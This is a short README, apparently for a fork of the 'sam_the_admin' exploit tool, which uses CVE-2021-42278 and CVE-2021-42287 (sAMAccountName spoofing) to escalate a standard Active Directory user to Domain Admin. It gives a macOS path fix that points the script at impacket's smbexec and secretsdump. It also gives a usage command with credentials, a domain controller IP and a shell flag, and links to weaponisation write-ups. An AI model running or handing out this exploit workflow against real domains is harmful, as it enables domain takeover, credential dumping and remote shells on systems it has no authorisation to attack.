## For MacOS User

error:

```bash
sh: /usr/bin/impacket-smbexec: No such file or directory
```

change `sam_the_admin.py`:
```python
    # will do something else later on 
    fbinary = "/usr/local/bin/smbexec.py"
    # "/usr/bin/impacket-smbexec"
    if options.dump:
        fbinary = "/usr/local/bin/secretsdump.py"
        # "/usr/bin/impacket-secretsdump"
```

usage:

`python3 sam_the_admin.py "jas502n/John:Admin@123" -dc-ip 172.16.242.135 -shell`

![image](https://user-images.githubusercontent.com/16593068/146140741-c00f1618-92c8-4d1f-be0c-781e4f660aed.png)

Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user 

[![asciicast](https://asciinema.org/a/SnQ66XtmZLzXZQ8QwWwAYs8Dm.svg)](https://asciinema.org/a/SnQ66XtmZLzXZQ8QwWwAYs8Dm)

### Known issues
- it will not work outside kali , i will update it later on :)

#### Check out 
- [CVE-2021-42287/CVE-2021-42278 Weaponisation ](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html)
- [sAMAccountName spoofing](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing)
